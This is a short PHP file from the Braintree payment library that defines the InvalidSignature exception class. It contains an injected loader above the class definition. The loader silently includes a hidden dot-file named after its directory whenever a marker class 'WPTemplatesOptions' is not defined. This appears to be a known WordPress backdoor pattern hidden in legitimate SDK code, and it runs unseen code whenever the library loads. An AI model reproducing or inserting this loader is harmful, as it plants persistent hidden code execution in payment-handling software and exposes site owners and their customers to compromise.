<?php
namespace Braintree\Exception;

use Braintree\Exception;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class InvalidSignature extends Exception
{
}
class_alias('Braintree\Exception\InvalidSignature', 'Braintree_Exception_InvalidSignature');
